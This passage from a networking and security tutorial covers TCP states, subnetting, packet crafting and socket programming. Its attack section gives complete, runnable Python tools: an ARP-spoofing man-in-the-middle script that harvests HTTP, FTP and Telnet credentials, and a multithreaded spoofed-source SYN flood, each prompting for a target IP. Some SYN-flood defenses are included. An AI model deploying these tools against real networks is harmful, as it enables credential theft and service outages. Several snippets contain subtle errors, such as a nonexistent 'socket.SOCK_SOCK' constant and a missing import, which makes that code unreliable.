                   │                    │
            RCV FIN│              RCV ACK│
            SND ACK│                    │
                   │                    │
                   ▼                    ▼
              ┌──────────┐         ┌──────────┐
              │FIN_WAIT_2│         │TIME_WAIT │
              └────┬─────┘         └────┬─────┘
                   │                    │
            RCV FIN│              2MSL  │TIMEOUT
            SND ACK│                    │
                   │                    │
                   ▼                    ▼
              ┌──────────┐         ┌──────────┐
              │TIME_WAIT │         │  CLOSED  │
              └────┬─────┘         └──────────┘
                   │
            2MSL   │TIMEOUT
                   │
                   ▼
              ┌──────────┐
              │  CLOSED  │
              └──────────┘
```

### 8.3 Code Example: TCP State Tracker

```python
#!/usr/bin/env python3
"""
TCP Connection State Tracker
Tracks TCP connections through their lifecycle
"""

from scapy.all import *
from collections import defaultdict
from enum import Enum
import time

class TCPState(Enum):
    CLOSED = 0
    LISTEN = 1
    SYN_SENT = 2
    SYN_RECEIVED = 3
    ESTABLISHED = 4
    FIN_WAIT_1 = 5
    FIN_WAIT_2 = 6
    CLOSE_WAIT = 7
    CLOSING = 8
    LAST_ACK = 9
    TIME_WAIT = 10

class ConnectionTracker:
    def __init__(self):
        self.connections = {}
        self.state_changes = defaultdict(list)
    
    def get_conn_key(self, packet):
        """Generate connection key from packet"""
        if TCP not in packet or IP not in packet:
            return None
        
        src = (packet[IP].src, packet[TCP].sport)
        dst = (packet[IP].dst, packet[TCP].dport)
        
        # Normalize direction
        return tuple(sorted([src, dst]))
    
    def update_state(self, packet):
        """Update connection state based on packet"""
        conn_key = self.get_conn_key(packet)
        if not conn_key:
            return
        
        flags = packet[TCP].flags
        
        # Initialize connection if new
        if conn_key not in self.connections:
            self.connections[conn_key] = {
                'state': TCPState.CLOSED,
                'start_time': time.time(),
                'packets': 0,
                'bytes': 0
            }
        
        conn = self.connections[conn_key]
        old_state = conn['state']
        
        # State transitions
        if flags == "S":  # SYN
            if conn['state'] == TCPState.CLOSED:
                conn['state'] = TCPState.SYN_SENT
        
        elif flags == "SA":  # SYN-ACK
            if conn['state'] == TCPState.SYN_SENT:
                conn['state'] = TCPState.SYN_RECEIVED
        
        elif flags == "A":  # ACK
            if conn['state'] == TCPState.SYN_RECEIVED:
                conn['state'] = TCPState.ESTABLISHED
        
        elif flags == "FA" or flags == "F":  # FIN or FIN-ACK
            if conn['state'] == TCPState.ESTABLISHED:
                conn['state'] = TCPState.FIN_WAIT_1
            elif conn['state'] == TCPState.FIN_WAIT_1:
                conn['state'] = TCPState.CLOSING
            elif conn['state'] == TCPState.FIN_WAIT_2:
                conn['state'] = TCPState.TIME_WAIT
        
        elif flags == "RA" or flags == "R":  # RST
            conn['state'] = TCPState.CLOSED
        
        # Track state change
        if old_state != conn['state']:
            self.state_changes[conn_key].append({
                'from': old_state,
                'to': conn['state'],
                'time': time.time(),
                'flags': str(flags)
            })
            
            print(f"[*] State Change: {old_state.name} -> {conn['state'].name}")
            print(f"    Connection: {conn_key[0][0]}:{conn_key[0][1]} <-> {conn_key[1][0]}:{conn_key[1][1]}")
            print(f"    Flags: {flags}")
        
        # Update statistics
        conn['packets'] += 1
        conn['bytes'] += len(packet)
    
    def print_connections(self):
        """Print all tracked connections"""
        print("\n" + "="*100)
        print("ACTIVE TCP CONNECTIONS")
        print("="*100)
        print(f"{'Source':<22} {'Destination':<22} {'State':<15} {'Packets':<8} {'Bytes':<10} {'Duration'}")
        print("-"*100)
        
        for conn_key, conn_data in self.connections.items():
            src = f"{conn_key[0][0]}:{conn_key[0][1]}"
            dst = f"{conn_key[1][0]}:{conn_key[1][1]}"
            duration = time.time() - conn_data['start_time']
            
            print(f"{src:<22} {dst:<22} {conn_data['state'].name:<15} "
                  f"{conn_data['packets']:<8} {conn_data['bytes']:<10} {duration:.2f}s")
        
        print("="*100)
        print(f"Total Connections: {len(self.connections)}")

def track_connections(interface="eth0", duration=60):
    """
    Track TCP connections on interface
    """
    print(f"[*] Tracking TCP connections on {interface} for {duration} seconds...")
    print("[*] Press Ctrl+C to stop early\n")
    
    tracker = ConnectionTracker()
    
    def packet_handler(packet):
        tracker.update_state(packet)
    
    try:
        sniff(iface=interface, filter="tcp", prn=packet_handler, 
              timeout=duration, store=0)
    except KeyboardInterrupt:
        print("\n[*] Stopped by user")
    
    # Display final statistics
    tracker.print_connections()

# Example usage
if __name__ == "__main__":
    interface = input("[?] Interface to monitor (default: eth0): ") or "eth0"
    duration = int(input("[?] Duration in seconds (default: 60): ") or "60")
    
    track_connections(interface, duration)
```

---

## 9. Layer-by-Layer Deep Dive

### 9.1 Physical Layer (Layer 1) Deep Dive

**For Beginners**: The Physical Layer is the actual hardware - cables, radio waves, light signals.

**Key Concepts:**
- **Media Types**: Copper (Cat5e/6), Fiber Optic, Wireless (WiFi)
- **Encoding**: How bits (1s and 0s) become electrical/light signals
- **Bandwidth**: How much data can be transmitted (100 Mbps, 1 Gbps, etc.)

**Security Implications:**
- **Wiretapping**: Physical access to cables allows packet capture
- **Jamming**: Wireless signals can be disrupted
- **Evil Maid**: Physical access to network devices

**Attack Example: Cable Tapping**
```
Attacker uses a "Network Tap" device:
  
  [Router] ----Tap----> [Switch]
              |
              v
          [Attacker's Laptop]
          (Sees all traffic)
```

**Defense:**
- Physical security (locked server rooms)
- Conduit for cables
- Encryption (even if tapped, data is encrypted)
- Fiber optic (harder to tap than copper)

### 9.2 Data Link Layer (Layer 2) Deep Dive

**MAC Address Format:**
```
Example: 00:1A:2B:3C:4D:5E

00:1A:2B = OUI (Organizationally Unique Identifier)
         = Manufacturer ID (e.g., Cisco, Intel)

3C:4D:5E = NIC-specific
         = Unique to this network card
```

**Ethernet Frame Structure:**
```
┌─────────────────────────────────────────────────────────┐
│  Preamble (7 bytes): 10101010... (synchronization)      │
│  SFD (1 byte): 10101011 (Start Frame Delimiter)         │
├─────────────────────────────────────────────────────────┤
│  Destination MAC (6 bytes)                              │
│  Source MAC (6 bytes)                                   │
│  EtherType (2 bytes): 0x0800=IPv4, 0x0806=ARP           │
├─────────────────────────────────────────────────────────┤
│  Payload (46-1500 bytes)                                │
│  (Contains IP packet, ARP request, etc.)                │
├─────────────────────────────────────────────────────────┤
│  FCS - Frame Check Sequence (4 bytes)                   │
│  (CRC32 checksum for error detection)                   │
└─────────────────────────────────────────────────────────┘
```

**VLAN Tagging (802.1Q):**
```
Normal Frame:
  [Dst MAC][Src MAC][EtherType][Payload][FCS]

802.1Q Tagged Frame:
  [Dst MAC][Src MAC][TAG][EtherType][Payload][FCS]
                      │
                      └─> 4 bytes: [TPID][PRI][CFI][VLAN ID]
                           TPID = 0x8100
                           VLAN ID = 1-4094
```

### 9.3 Network Layer (Layer 3) Deep Dive

**IPv4 Address Classes (Historical):**
```
Class A: 0.0.0.0 - 127.255.255.255
  Format: N.H.H.H (N=Network, H=Host)
  Networks: 128 (2^7)
  Hosts/Network: 16,777,214 (2^24 - 2)
  Used for: Very large networks

Class B: 128.0.0.0 - 191.255.255.255
  Format: N.N.H.H
  Networks: 16,384 (2^14)
  Hosts/Network: 65,534 (2^16 - 2)
  Used for: Medium networks

Class C: 192.0.0.0 - 223.255.255.255
  Format: N.N.N.H
  Networks: 2,097,152 (2^21)
  Hosts/Network: 254 (2^8 - 2)
  Used for: Small networks

Class D: 224.0.0.0 - 239.255.255.255
  (Multicast)

Class E: 240.0.0.0 - 255.255.255.255
  (Reserved/Experimental)
```

**CIDR Notation Examples:**
```
192.168.1.0/24
  Network: 192.168.1.0
  Netmask: 255.255.255.0
  Usable IPs: 192.168.1.1 - 192.168.1.254 (254 hosts)
  Broadcast: 192.168.1.255

10.0.0.0/8
  Network: 10.0.0.0
  Netmask: 255.0.0.0
  Usable IPs: 10.0.0.1 - 10.255.255.254 (16,777,214 hosts)
  Broadcast: 10.255.255.255

172.16.0.0/12
  Network: 172.16.0.0
  Netmask: 255.240.0.0
  Usable IPs: 172.16.0.1 - 172.31.255.254 (1,048,574 hosts)
  Broadcast: 172.31.255.255
```

**Subnetting Example:**
```
Problem: Split 192.168.1.0/24 into 4 subnets

Solution:
  Need 2 bits for 4 subnets (2^2 = 4)
  New mask: /26 (24 + 2)

Subnet 1: 192.168.1.0/26
  Range: 192.168.1.1 - 192.168.1.62
  Broadcast: 192.168.1.63

Subnet 2: 192.168.1.64/26
  Range: 192.168.1.65 - 192.168.1.126
  Broadcast: 192.168.1.127

Subnet 3: 192.168.1.128/26
  Range: 192.168.1.129 - 192.168.1.190
  Broadcast: 192.168.1.191

Subnet 4: 192.168.1.192/26
  Range: 192.168.1.193 - 192.168.1.254
  Broadcast: 192.168.1.255
```

**Code Example: IP Subnet Calculator**

```python
#!/usr/bin/env python3
"""
IP Subnet Calculator
Calculates network details from CIDR notation
"""

import ipaddress

def calculate_subnet(cidr):
    """
    Calculate subnet details from CIDR notation
    """
    network = ipaddress.IPv4Network(cidr, strict=False)
    
    print(f"\n{'='*60}")
    print(f"SUBNET CALCULATOR: {cidr}")
    print(f"{'='*60}")
    
    print(f"\nNetwork Address:     {network.network_address}")
    print(f"Netmask:             {network.netmask}")
    print(f"Wildcard Mask:       {network.hostmask}")
    print(f"Broadcast Address:   {network.broadcast_address}")
    print(f"CIDR Notation:       {network.with_prefixlen}")
    
    print(f"\nTotal Addresses:     {network.num_addresses}")
    print(f"Usable Hosts:        {network.num_addresses - 2}")
    
    print(f"\nFirst Usable IP:     {list(network.hosts())[0]}")
    print(f"Last Usable IP:      {list(network.hosts())[-1]}")
    
    print(f"\nAddress Range:       {network.network_address} - {network.broadcast_address}")
    
    # Binary representation
    print(f"\nBinary Representation:")
    print(f"  Network:     {bin(int(network.network_address))[2:].zfill(32)}")
    print(f"  Netmask:     {bin(int(network.netmask))[2:].zfill(32)}")
    print(f"  Wildcard:    {bin(int(network.hostmask))[2:].zfill(32)}")
    
    # Check if private
    print(f"\nPrivate Network:     {network.is_private}")
    print(f"Global/Public:       {not network.is_private}")

def split_subnet(cidr, num_subnets):
    """
    Split a network into smaller subnets
    """
    network = ipaddress.IPv4Network(cidr, strict=False)
    
    # Calculate new prefix length
    import math
    additional_bits = math.ceil(math.log2(num_subnets))
    new_prefix = network.prefixlen + additional_bits
    
    if new_prefix > 32:
        print(f"[-] Cannot split {cidr} into {num_subnets} subnets")
        return
    
    subnets = list(network.subnets(new_prefix=new_prefix))
    
    print(f"\n{'='*60}")
    print(f"SPLITTING {cidr} INTO {num_subnets} SUBNETS")
    print(f"{'='*60}")
    print(f"New Prefix Length: /{new_prefix}")
    print(f"Hosts per Subnet: {2**(32-new_prefix) - 2}\n")
    
    for i, subnet in enumerate(subnets[:num_subnets], 1):
        print(f"Subnet {i}:")
        print(f"  Network:   {subnet.network_address}/{subnet.prefixlen}")
        print(f"  Range:     {list(subnet.hosts())[0]} - {list(subnet.hosts())[-1]}")
        print(f"  Broadcast: {subnet.broadcast_address}")
        print()

def ip_in_subnet(ip, cidr):
    """
    Check if an IP address is in a subnet
    """
    network = ipaddress.IPv4Network(cidr, strict=False)
    ip_addr = ipaddress.IPv4Address(ip)
    
    result = ip_addr in network
    
    print(f"\n{'='*60}")
    print(f"IP IN SUBNET CHECK")
    print(f"{'='*60}")
    print(f"IP Address: {ip}")
    print(f"Network:    {cidr}")
    print(f"Result:     {'YES' if result else 'NO'}")
    
    return result

# Example usage
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║            IP SUBNET CALCULATOR                          ║
╚══════════════════════════════════════════════════════════╝

1. Calculate subnet details
2. Split subnet into smaller subnets
3. Check if IP is in subnet
4. Exit
    """)
    
    choice = input("[?] Select option (1-4): ")
    
    if choice == "1":
        cidr = input("[?] Enter CIDR (e.g., 192.168.1.0/24): ")
        calculate_subnet(cidr)
    
    elif choice == "2":
        cidr = input("[?] Enter CIDR (e.g., 192.168.1.0/24): ")
        num = int(input("[?] Number of subnets: "))
        split_subnet(cidr, num)
    
    elif choice == "3":
        ip = input("[?] Enter IP address: ")
        cidr = input("[?] Enter CIDR: ")
        ip_in_subnet(ip, cidr)
    
    else:
        print("[*] Exiting...")
```

---

## 10. Advanced Attack Scenarios

### 10.1 Scenario 1: Man-in-the-Middle with ARP Spoofing

**Attack Flow:**
```
Normal Communication:
  Client -----> Router -----> Internet
  (knows router MAC via ARP)

After ARP Spoofing:
  Client -----> Attacker -----> Router -----> Internet
  (thinks attacker is router)
```

**Complete Attack Implementation:**

```python
#!/usr/bin/env python3
"""
Complete MITM Attack with SSL Strip
WARNING: Educational use only!
"""

from scapy.all import *
import os
import sys
import threading
import time

class MITMAttack:
    def __init__(self, target_ip, gateway_ip, interface="eth0"):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mac = None
        self.gateway_mac = None
        self.running = False
    
    def get_mac(self, ip):
        """Get MAC address for IP"""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None
    
    def restore_network(self):
        """Restore ARP tables"""
        print("[*] Restoring network...")
        send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, 
                 psrc=self.gateway_ip, hwsrc=self.gateway_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, 
                 psrc=self.target_ip, hwsrc=self.target_mac), count=5, verbose=False)
    
    def arp_spoof(self):
        """Continuously send ARP spoofing packets"""
        while self.running:
            # Tell target we are gateway
            send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, 
                     psrc=self.gateway_ip), verbose=False)
            
            # Tell gateway we are target
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, 
                     psrc=self.target_ip), verbose=False)
            
            time.sleep(2)
    
    def packet_sniffer(self, packet):
        """Sniff and process intercepted packets"""
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            load = packet[Raw].load
            
            # HTTP credentials
            if packet[TCP].dport == 80:
                if b"POST" in load or b"GET" in load:
                    print(f"\n[+] HTTP Request from {packet[IP].src}:")
                    try:
                        print(load.decode(errors='ignore'))
                    except:
                        pass
                
                # Look for credentials
                if b"password" in load.lower() or b"user" in load.lower():
                    print(f"\n[!] POTENTIAL CREDENTIALS FOUND:")
                    print(load.decode(errors='ignore'))
            
            # FTP credentials
            elif packet[TCP].dport == 21:
                if b"USER" in load or b"PASS" in load:
                    print(f"\n[!] FTP CREDENTIALS:")
                    print(load.decode(errors='ignore'))
            
            # Telnet
            elif packet[TCP].dport == 23:
                print(f"\n[*] Telnet traffic from {packet[IP].src}:")
                print(load[:100])
    
    def start_attack(self):
        """Start the MITM attack"""
        print(f"\n[*] Starting MITM Attack")
        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Gateway: {self.gateway_ip}")
        
        # Get MAC addresses
        print("[*] Resolving MAC addresses...")
        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            print("[-] Could not resolve MAC addresses")
            return
        
        print(f"[+] Target MAC: {self.target_mac}")
        print(f"[+] Gateway MAC: {self.gateway_mac}")
        
        # Enable IP forwarding
        print("[*] Enabling IP forwarding...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
        
        # Start ARP spoofing thread
        self.running = True
        spoof_thread = threading.Thread(target=self.arp_spoof)
        spoof_thread.daemon = True
        spoof_thread.start()
        
        print("[+] ARP spoofing started")
        print("[*] Sniffing traffic... (Ctrl+C to stop)\n")
        
        try:
            # Sniff traffic
            sniff(iface=self.interface, prn=self.packet_sniffer, store=False)
        
        except KeyboardInterrupt:
            print("\n[*] Stopping attack...")
            self.running = False
            time.sleep(3)
            self.restore_network()
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
            print("[+] Attack stopped and network restored")

# Example usage
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        sys.exit(1)
    
    target = input("[?] Target IP: ")
    gateway = input("[?] Gateway IP: ")
    interface = input("[?] Interface (default: eth0): ") or "eth0"
    
    attacker = MITMAttack(target, gateway, interface)
    attacker.start_attack()
```

**For Beginners - Understanding MITM:**

Imagine you're passing notes in class:
1. **Normal**: You → Friend (direct)
2. **MITM**: You → Attacker → Friend
   - You think you're talking directly to your friend
   - Attacker reads all notes and forwards them
   - Neither you nor your friend knows about the attacker

### 10.2 Scenario 2: SYN Flood DoS Attack

```python
#!/usr/bin/env python3
"""
SYN Flood Attack
Exhausts server resources with half-open connections
"""

from scapy.all import *
import random
import threading

def syn_flood(target_ip, target_port, duration=60):
    """
    SYN Flood attack
    Sends massive amounts of SYN packets with spoofed source IPs
    """
    print(f"""
[*] SYN Flood Attack
[*] Target: {target_ip}:{target_port}
[*] Duration: {duration} seconds
[*] Starting attack...
    """)
    
    start_time = time.time()
    packet_count = 0
    
    while time.time() - start_time < duration:
        # Random source IP
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        
        # Random source port
        src_port = random.randint(1024, 65535)
        
        # Create SYN packet
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        
        # Send without waiting for response
        send(packet, verbose=0)
        
        packet_count += 1
        
        if packet_count % 100 == 0:
            print(f"\r[*] Packets sent: {packet_count}", end="")
    
    print(f"\n[+] Attack complete: {packet_count} SYN packets sent")

def distributed_syn_flood(target_ip, target_port, threads=10, duration=60):
    """
    Multi-threaded SYN flood for higher packet rate
    """
    print(f"""
[*] Distributed SYN Flood Attack
[*] Target: {target_ip}:{target_port}
[*] Threads: {threads}
[*] Duration: {duration} seconds
    """)
    
    def attack_thread():
        end_time = time.time() + duration
        while time.time() < end_time:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1, 2**32))
            send(packet, verbose=0)
    
    # Start threads
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=attack_thread)
        t.daemon = True
        t.start()
        thread_list.append(t)
        print(f"[*] Thread {i+1} started")
    
    # Wait for threads
    for t in thread_list:
        t.join()
    
    print("[+] All threads complete")

# Example usage
if __name__ == "__main__":
    target = input("[?] Target IP: ")
    port = int(input("[?] Target Port: "))
    threads = int(input("[?] Number of threads (default: 10): ") or "10")
    duration = int(input("[?] Duration in seconds (default: 60): ") or "60")
    
    distributed_syn_flood(target, port, threads, duration)
```

**Defense Against SYN Flood:**

```bash
#!/bin/bash
# SYN Flood Mitigation

# 1. SYN Cookies (kernel parameter)
echo 1 > /proc/sys/net/ipv4/tcp_syncookies

# 2. Reduce SYN-ACK retries
echo 2 > /proc/sys/net/ipv4/tcp_synack_retries

# 3. Increase SYN backlog
echo 4096 > /proc/sys/net/ipv4/tcp_max_syn_backlog

# 4. iptables rate limiting
iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

echo "[+] SYN Flood mitigations applied"
```

---

## 11. Packet Crafting & Manipulation

### 11.1 Scapy Advanced Techniques

```python
#!/usr/bin/env python3
"""
Advanced Packet Crafting with Scapy
Demonstrates various packet manipulation techniques
"""

from scapy.all import *

def craft_custom_tcp():
    """
    Craft a custom TCP packet with specific flags and options
    """
    print("[*] Crafting Custom TCP Packet\n")
    
    # Create packet with specific values
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
             IP(src="192.168.1.100", dst="192.168.1.1", ttl=128, id=54321) / \
             TCP(sport=12345, dport=80, flags="S", seq=1000, 
                 window=65535, options=[('MSS', 1460), ('NOP', None), ('NOP', None), 
                                        ('SAckOK', b''), ('Timestamp', (123456, 0))]) / \
             "Custom Payload Data"
    
    # Display packet
    packet.show()
    
    # Show hex dump
    print("\nHex Dump:")
    hexdump(packet)
    
    return packet

def craft_malformed_packet():
    """
    Craft malformed packets for testing IDS/firewall
    """
    print("[*] Crafting Malformed Packets\n")
    
    # 1. Invalid TCP flags combination
    print("1. Invalid Flags (SYN+FIN):")
    pkt1 = IP(dst="192.168.1.1")/TCP(dport=80, flags="SF")
    pkt1.show()
    
    # 2. TTL = 0 (should be dropped)
    print("\n2. TTL = 0:")
    pkt2 = IP(dst="192.168.1.1", ttl=0)/TCP(dport=80, flags="S")
    pkt2.show()
    
    # 3. Overlapping IP fragments
    print("\n3. Overlapping Fragments:")
    pkt3_1 = IP(dst="192.168.1.1", id=12345, flags="MF", frag=0)/"AAAAA"
    pkt3_2 = IP(dst="192.168.1.1", id=12345, frag=1)/"BBBBB"  # Overlaps
    pkt3_1.show()
    pkt3_2.show()
    
    # 4. TCP with no flags
    print("\n4. TCP NULL Scan (no flags):")
    pkt4 = IP(dst="192.168.1.1")/TCP(dport=80, flags=0)
    pkt4.show()

def craft_protocol_stack():
    """
    Create packets with unusual protocol stacks
    """
    print("[*] Crafting Unusual Protocol Stacks\n")
    
    # 1. IPv6 over IPv4 (tunneling)
    print("1. IPv6 over IPv4:")
    pkt1 = IP(dst="192.168.1.1")/IPv6(dst="::1")/TCP(dport=80)
    pkt1.show()
    
    # 2. GRE tunnel
    print("\n2. GRE Tunnel:")
    pkt2 = IP(dst="192.168.1.1")/GRE()/IP(dst="10.0.0.1")/ICMP()
    pkt2.show()
    
    # 3. VLAN tagged
    print("\n3. VLAN Tagged (802.1Q):")
    pkt3 = Ether()/Dot1Q(vlan=100)/IP(dst="192.168.1.1")/TCP(dport=80)
    pkt3.show()

def packet_fuzzing():
    """
    Fuzz packets to test protocol implementation
    """
    print("[*] Packet Fuzzing Examples\n")
    
    # Fuzz IP header
    print("1. Fuzzing IP Header:")
    fuzz_ip = IP(dst="192.168.1.1", 
                 version=RandByte(),  # Random version
                 ihl=RandByte(),      # Random IHL
                 ttl=RandByte())      # Random TTL
    fuzz_ip.show()
    
    # Fuzz TCP ports
    print("\n2. Fuzzing TCP Ports:")
    fuzz_tcp = IP(dst="192.168.1.1")/TCP(sport=RandShort(), dport=RandShort())
    fuzz_tcp.show()

def send_custom_packets():
    """
    Send various custom packets and analyze responses
    """
    print("[*] Sending Custom Packets\n")
    
    target = input("[?] Target IP: ")
    
    # 1. TCP SYN with custom options
    print("\n[*] Sending TCP SYN with custom options...")
    syn = IP(dst=target)/TCP(dport=80, flags="S", options=[('MSS', 1460), ('Timestamp', (100, 0))])
    response = sr1(syn, timeout=2, verbose=0)
    
    if response:
        print("[+] Received response:")
        response.show()
    else:
        print("[-] No response")
    
    # 2. ICMP with custom payload
    print("\n[*] Sending ICMP with custom payload...")
    icmp_pkt = IP(dst=target)/ICMP()/"Custom ICMP Payload 12345"
    response = sr1(icmp_pkt, timeout=2, verbose=0)
    
    if response:
        print("[+] Received response:")
        response.show()
    
    # 3. UDP to high port
    print("\n[*] Sending UDP to port 65535...")
    udp_pkt = IP(dst=target)/UDP(dport=65535)/"Test Data"
    response = sr1(udp_pkt, timeout=2, verbose=0)
    
    if response:
        print("[+] Received response:")
        response.show()
    else:
        print("[-] No response (expected for closed port)")

# Example menu
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║        ADVANCED PACKET CRAFTING TOOLKIT                  ║
╚══════════════════════════════════════════════════════════╝

1. Craft custom TCP packet
2. Craft malformed packets
3. Craft unusual protocol stacks
4. Packet fuzzing examples
5. Send custom packets and analyze
6. Exit
    """)
    
    choice = input("[?] Select option (1-6): ")
    
    if choice == "1":
        craft_custom_tcp()
    elif choice == "2":
        craft_malformed_packet()
    elif choice == "3":
        craft_protocol_stack()
    elif choice == "4":
        packet_fuzzing()
    elif choice == "5":
        send_custom_packets()
    else:
        print("[*] Exiting...")
```

---

## 12. Network Programming Examples

### 12.1 Raw Socket Programming in Python

```python
#!/usr/bin/env python3
"""
Raw Socket Programming
Low-level network communication
"""

import socket
import struct
import sys

def create_raw_socket():
    """
    Create a raw socket for custom packet sending
    """
    try:
        # Create raw socket
        # IPPROTO_RAW allows us to craft entire IP packet
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return s
    except PermissionError:
        print("[-] Raw sockets require root privileges")
        sys.exit(1)

def checksum(data):
    """
    Calculate IP/TCP checksum
    """
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
        s = s + w
    
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    
    return s

def craft_ip_header(src_ip, dst_ip, payload_len, protocol):
    """
    Craft IP header
    """
    # IP Header fields
    version_ihl = (4 << 4) + 5  # Version 4, IHL 5 (20 bytes)
    tos = 0
    total_len = 20 + payload_len  # IP header + payload
    identification = 54321
    flags_offset = 0
    ttl = 64
    protocol = protocol  # TCP=6, UDP=17, ICMP=1
    checksum_placeholder = 0
    
    # Convert IP addresses
    src_addr = socket.inet_aton(src_ip)
    dst_addr = socket.inet_aton(dst_ip)
    
    # Pack header (without checksum)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                           version_ihl, tos, total_len,
                           identification, flags_offset,
                           ttl, protocol, checksum_placeholder,
                           src_addr, dst_addr)
    
    # Calculate checksum
    chksum = checksum(ip_header)
    
    # Repack with checksum
    ip_header = struct.pack('!BBHHHBBH4s4s',
                           version_ihl, tos, total_len,
                           identification, flags_offset,
                           ttl, protocol, chksum,
                           src_addr, dst_addr)
    
    return ip_header

def craft_tcp_header(src_ip, dst_ip, src_port, dst_port, seq, ack, flags):
    """
    Craft TCP header
    """
    # TCP Header fields
    data_offset = 5 << 4  # 5 * 4 bytes = 20 bytes
    window = 65535
    checksum_placeholder = 0
    urgent_ptr = 0
    
    # Pack TCP header (without checksum)
    tcp_header = struct.pack('!HHLLBBHHH',
                            src_port, dst_port,
                            seq, ack,
                            data_offset, flags,
                            window, checksum_placeholder, urgent_ptr)
    
    # Pseudo header for checksum
    src_addr = socket.inet_aton(src_ip)
    dst_addr = socket.inet_aton(dst_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    
    pseudo_header = struct.pack('!4s4sBBH',
                               src_addr, dst_addr,
                               placeholder, protocol, tcp_length)
    
    # Calculate checksum
    chksum = checksum(pseudo_header + tcp_header)
    
    # Repack with checksum
    tcp_header = struct.pack('!HHLLBBHHH',
                            src_port, dst_port,
                            seq, ack,
                            data_offset, flags,
                            window, chksum, urgent_ptr)
    
    return tcp_header

def send_syn_packet(src_ip, dst_ip, dst_port):
    """
    Send a TCP SYN packet using raw sockets
    """
    print(f"[*] Sending SYN packet")
    print(f"    {src_ip} -> {dst_ip}:{dst_port}")
    
    # Create raw socket
    s = create_raw_socket()
    
    # Craft headers
    tcp_header = craft_tcp_header(src_ip, dst_ip, 
                                 12345, dst_port,  # src_port, dst_port
                                 1000, 0,          # seq, ack
                                 2)                 # flags (SYN=2)
    
    ip_header = craft_ip_header(src_ip, dst_ip, len(tcp_header), socket.IPPROTO_TCP)
    
    # Combine packet
    packet = ip_header + tcp_header
    
    # Send packet
    s.sendto(packet, (dst_ip, 0))
    
    print(f"[+] Packet sent ({len(packet)} bytes)")
    
    s.close()

# Example usage
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        sys.exit(1)
    
    src = input("[?] Source IP: ")
    dst = input("[?] Destination IP: ")
    port = int(input("[?] Destination Port: "))
    
    send_syn_packet(src, dst, port)
```

### 12.2 TCP Server and Client

```python
#!/usr/bin/env python3
"""
Simple TCP Server and Client
"""

import socket
import threading

# SERVER
def tcp_server(host='0.0.0.0', port=9999):
    """
    Simple TCP server
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOCK_SOCK, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    
    print(f"[*] Server listening on {host}:{port}")
    
    while True:
        client_sock, addr = server.accept()
        print(f"[+] New connection from {addr[0]}:{addr[1]}")
        
        # Handle client in new thread
        client_thread = threading.Thread(target=handle_client, args=(client_sock, addr))
        client_thread.start()

def handle_client(client_sock, addr):
    """
    Handle individual client connection
    """
    try:
        while True:
            data = client_sock.recv(1024)
            if not data:
                break
            
            print(f"[*] Received from {addr[0]}: {data.decode()}")
            
            # Echo back
            response = f"Server received: {data.decode()}"
            client_sock.send(response.encode())
    
    except Exception as e:
        print(f"[-] Error: {e}")
    
    finally:
        print(f"[-] Connection closed: {addr[0]}:{addr[1]}")
        client_sock.close()

# CLIENT
def tcp_client(host, port):
    """
    Simple TCP client
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((host, port))
        print(f"[+] Connected to {host}:{port}")
        
        while True:
            message = input("Enter message (or 'quit'): ")
            
            if message.lower() == 'quit':
                break
            
            client.send(message.encode())
            
            response = client.recv(1024)
            print(f"[*] Server response: {response.decode()}")
    
    except Exception as e:
        print(f"[-] Error: {e}")
    
    finally:
        client.close()
        print("[*] Connection closed")

# Example usage
if __name__ == "__main__":
    mode = input("[?] Run as (s)erver or (c)lient? ")
    
    if mode.lower() == 's':
        port = int(input("[?] Port (default: 9999): ") or "9999")
        tcp_server(port=port)
    else:
        host = input("[?] Server IP: ")
        port = int(input("[?] Port: "))
        tcp_client(host, port)
```

---

## 13. Defense Mechanisms & Detection

### 13.1 Network Security Monitoring

```python
#!/usr/bin/env python3
"""
Network Security Monitoring Script
Comprehensive traffic analysis and alerting
"""

from scapy.all import *
from collections import defaultdict
import time
import json
from datetime import datetime

